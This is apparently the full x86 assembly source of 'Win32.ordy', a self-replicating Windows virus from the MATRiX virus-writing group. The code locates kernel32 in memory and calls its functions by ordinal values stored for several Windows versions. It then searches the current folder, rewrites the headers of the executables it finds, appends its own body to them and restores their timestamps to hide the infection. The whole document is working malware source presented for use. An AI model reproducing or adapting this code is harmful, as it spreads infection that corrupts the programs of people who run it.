
comment "
Win32.ordy by mort[MATRiX]
          - simple direct action current dir last section PE appender
          - using ordinal API values to access API

Well,  in viriis there's mostly use some stuff to find APIs no matter
of kernel32.dll type,... I use  APIs' ordinal values  to access APIs.
API's address is counted right before it's used,...
When  i  searched  for  this  values in different versions of widows,
i found they differ, so i included all ord values i was able to find.
U find them in ord.zip file in tools section.
I cant test thiss virii on all windoze versions. This one seems to be
good under win2k,  anyway  if  u  wanna run it under another, recheck
API's count,...

greetz    All who helped me to create ordinal log
          MiCr0s0fT - i founded my CreateFileA API DF sensitive,...
                      r there more? :)))
"


.486
.model flat,stdcall

extrn     ExitProcess         : proc
extrn     MessageBoxA         : proc

filetime           struc
         FT_dwLowDateTime        dd ?              
         FT_dwHighDateTime       dd ?              
filetime           ends              
fileSearch         struc             
         FileAttributes          dd ?              
         CreationTime            filetime ?        
         LastAccessTime          filetime ?        
         LastWriteTime           filetime ?        
         FileSizeHigh            dd ?              
         FileSizeLow             dd ?              
         Reserved0               dd ?              
         Reserved1               dd ?              
         FileName                db 0260h dup(?)
         AlternateFileName       db 13 dup(?)     
                                 db 3 dup(?)      
fileSearch          ends             

_vSize              = ((@retAdd - @ordy) / 0200h + 1) * 0200h
_DEBUG              = 0

.data
dd ?

.code
@ordy:
          mov eax,@retAdd - @ordy
          push offset @retAdd
_retAddress         equ $ - 4

          pushad
          call @SEH

          add esp,8
          mov esp,[esp]
          pop dword ptr fs:[0]
          pop eax
          popad
          ret
          
          if _DEBUG
          db 01000h dup(0)    ;coz of debug symbols,...:(
          endif
          
@SEH:
          push dword ptr fs:[0]
          mov dword ptr fs:[0],esp

          xor eax,eax
          call @findKernel
@delta              label

          mov ebp,[esp - 4]             ;get delta handle

          mov [ebp + _kBase - @delta],eax

          mov ebx,eax                   ;get kernel values,...
          add eax,dword ptr [eax + 03ch]          
          add eax,078h
          mov eax,[eax]
          add eax,ebx
          add eax,018h
          xchg eax,esi
          lodsd
          push eax
          lodsd
          add eax,ebx
          mov [ebp + _addBase - @delta],eax
          pop eax
                    
          lea edi,[ebp + _ordinals - @delta - (_ordEnd - _ordStart - 2)]

@nextOrdinal:
          add edi,(_ordEnd - _ordStart) - 2
          scasw
          jnz @nextOrdinal
          mov [ebp + _ordinalBase - @delta],edi
          
          push 02000h
          push 040h
          mov eax,_GlobalAlloc
          call @callAPI
          push eax            ;for GlobalFree
          
          push eax
          call @mask
          db '*.*',0
@mask:
          mov eax,_FindFirstFileA
          call @callAPI
          xchg eax,esi
          
@examine:          
          mov eax,[esp]
          mov al,byte ptr [eax + FileAttributes]
          and al,010h
          cmp al,010h
          jnz @fileFounded
          
@nextFile:          
          push dword ptr [esp]
          push esi
          mov eax,_FindNextFileA
          call @callAPI
          dec eax
          jz @examine
          
          mov eax,_GlobalFree
          call @callAPI

          xor eax,eax
          sub eax,[esp + 030h]          ;cause exception
          
@findKernel:
          add eax,[esp + 030h]
          and eax,0fffff000h
          
@nextPage:
          sub eax,01000h
          cmp word ptr [eax],'ZM'
          jnz @nextPage
          ret
;------------------------------------------------------------------------
@rw:
;         edi - file handle
;         eax - ReadFile/WriteFile
;         edx - buffer
;         ecx - size

          pushad
          push 0
          call @fw
          dd ?
@fw:
          push ecx edx edi
          call @callAPI
          popad
          ret

;------------------------------------------------------------------------
@fileFounded:
          if _DEBUG
          mov eax,[esp]
          cmp dword ptr [eax + FileName],'SOHG'
          jz @oki
          jmp @nextFile
@oki:          
          endif

          mov ebx,[esp]          
          mov eax,[ebx + FileSizeLow]
          cmp eax,04000h
          jb @nextFile
          
          mov eax,dword ptr [ebx + FileName]
          and dword ptr [ebx + LastWriteTime],eax
          jz @nextFile
          or dword ptr [ebx + LastWriteTime],eax
                    
          mov edx,_ReadFile
          xchg eax,ebx
          add eax,01000h
          xchg eax,edx
          call @openRW

          push edx
          push edi
          mov eax,_CloseHandle
          call @callAPI
          
          pop edx
          
          cld
          mov edi,edx
          mov eax,'EPZM'
          scasw
          jnz @nextFile
          shr eax,010h
          std
          add edi,dword ptr [edi + 03ah]          
          scasw
          scasw
          jnz @nextFile

          mov eax,[edi + 076h]
          shl eax,3
          add eax,052h
          xchg eax,ebx
          movzx eax,word ptr [edi + 8]
          imul eax,028h
          xadd ebx,eax
          
          mov eax,_vSize
          add [edi + 052h],eax                    ;add imagesize
          xadd [ebx + edi + 010h],eax             ;eax - old size
          push eax
          add eax,[ebx + edi + 014h]              ;add phys. offset
          mov [ebp + _virBodyPofs - @delta],eax
          pop eax
          add eax,[ebx + edi + 0ch]
          xchg eax,[edi + 02ah]                   ;set/get entrypoint
          add eax,[edi + 036h]
          mov [ebp + _retAddress - @delta],eax    ;set it,...
          add dword ptr [ebx + edi + 08h],01000h  ;add virtual size
          or dword ptr [ebx + edi + 024h],0a0000020h
          
          lea eax,[ebp + @finalInfection - @delta]             
          push eax
          mov eax,_WriteFile
          
@openRW:
          mov ecx,01000h

          cld                 ;coz of CreateFileA DF sensitivity,...:)))
          call @open
          call @rw                    
          ret

;------------------------------------------------------------------------
@setA:
          push ebx
          push eax
          mov eax,_SetFileAttributesA
          call @callAPI          
          ret

;-----------------------------------------------------------------------
_CloseHandle        = 0                 ;API handles
_CreateFileA        = 2
_GlobalAlloc        = 4
_GlobalFree         = 6
_WriteFile          = 8 
_ReadFile           = 0ah
_FindFirstFileA     = 0ch
_FindNextFileA      = 0eh
_SetEndOfFile       = 010h
_SetFileTime        = 012h
_SetFileAttributesA = 014h

_ordSize            equ _ordEnd - _ordStart
;shl 2
_ordinals           label

_ordStart           label
_ordinals95         label
          dw 0682             ;APIs num
          dw 088h * 4         ;CloseHandle
          dw 09dh * 4         ;CreateFileA
          dw 01b5h * 4        ;GlobalAlloc
          dw 01bch * 4        ;GlobalFree
          dw 02e3h * 4        ;WriteFile
          dw 0242h * 4        ;ReadFile
          dw 0f9h  * 4        ;FindFirstFileA
          dw 0fch  * 4        ;FindNextFile
          dw 0281h * 4        ;SetEndOfFile
          dw 028bh * 4        ;SetFileTime
          dw 0288h * 4        ;SetFileAttributesA
_ordEnd             label
          
_ordinals98         label     ;(r1,SE)
          dw 0745             ;APIs num
          dw 09fh * 4         ;CloseHandle
          dw 0b8h * 4         ;CreateFileA
          dw 01e5h * 4        ;GlobalAlloc
          dw 01ech * 4        ;GlobalFree
          dw 0335h * 4        ;WriteFile
          dw 027dh * 4        ;ReadFile
          dw 011bh * 4        ;FindFirstFileA
          dw 0120h * 4        ;FindNextFile
          dw 02c5h * 4        ;SetEndOfFile
          dw 02cfh * 4        ;SetFileTime
          dw 02cch * 4        ;SetFileAttributesA

_ordinalsNT         label
          dw 02a1h            ;APIs num
          dw 018h  * 4        ;CloseHandle
          dw 031h  * 4        ;CreateFileA
          dw 0155h * 4        ;GlobalAlloc
          dw 015ch * 4        ;GlobalFree
          dw 027bh * 4        ;WriteFile
          dw 01d6h * 4        ;ReadFile
          dw 082h  * 4        ;FindFirstFileA
          dw 087h  * 4        ;FindNextFile
          dw 0210h * 4        ;SetEndOfFile
          dw 021ah * 4        ;SetFileTime
          dw 0217h * 4        ;SetFileAttributesA

_ordinals2k         label
          dw 0337h            ;APIs num
          dw 01eh  * 4        ;CloseHandle
          dw 037h  * 4        ;CreateFileA
          dw 019ch * 4        ;GlobalAlloc
          dw 01a3h * 4        ;GlobalFree
          dw 030eh * 4        ;WriteFile
          dw 023dh * 4        ;ReadFile
          dw 0a3h  * 4        ;FindFirstFileA
          dw 0ach  * 4        ;FindNextFile
          dw 028ch * 4        ;SetEndOfFile
          dw 0297h * 4        ;SetFileTime
          dw 0293h * 4        ;SetFileAttributesA

;------------------------------------------------------------------------
@open:
          ;eax - filename
          pushad
          mov eax,[esp + 028h]
          add eax,FileName
          push 0 0 3 0 1 
          push 080000000h or 040000000h
          push eax

          mov ebx,020h
          call @setA

          mov eax,_CreateFileA
          call @callAPI
          mov [esp],eax                 ;handle to edi
          popad
          ret                          
          
;-------------------------------------------------------
;eax - API handle
@callAPI:
          pop edi
          add eax,012345678h
_ordinalBase        equ $ - 4
          movzx eax,word ptr [eax]                    
          add eax,012345678h
_addBase            equ $ - 4
          mov eax,[eax]
          add eax,012345678h
_kBase              equ $ - 4          
          call eax
          jmp edi          
;----------------------------------------------------------------
@finalInfection:
          mov eax,012345678h
_virBodyPofs        equ $ - 4
          sub eax,01000h
          push eax
          mov eax,_ReadFile
          xor ecx,ecx
          inc ecx

@nextByte2Seek:
          call @rw
          dec dword ptr [esp]
          jnz @nextByte2Seek
          pop eax
                    
          mov ecx,_vSize
          lea edx,[ebp + @ordy - @delta]
          add eax,_WriteFile
          call @rw
          
          push esi            
          
          push edi edi
          mov eax,_SetEndOfFile
          call @callAPI

          mov ebx,[esp]
          mov eax,[esp + 0ch]
          add eax,LastWriteTime
          push eax
          sub eax,8
          push eax
          sub eax,8
          push eax
          push ebx
          mov eax,_SetFileTime
          call @callAPI
          
          mov eax,_CloseHandle
          call @callAPI
          
          mov ebx,[esp + 4]
          mov eax,[ebx + FileAttributes]
          xchg eax,ebx
          add eax,FileName
          call @setA
          
          pop esi             ;restore search handle
          
@fuckFile:          
          jmp @nextFile

@retAdd:
          push 0
          call @title
          db '.ordy by mort[MATRiX]',0
@title:
          call @mess
          db 'hey guys, CreateFileA API is DF sensitive!!! :)))',0
@mess:
          push 0
          call MessageBoxA
          call ExitProcess,0
          ret
end @ordy
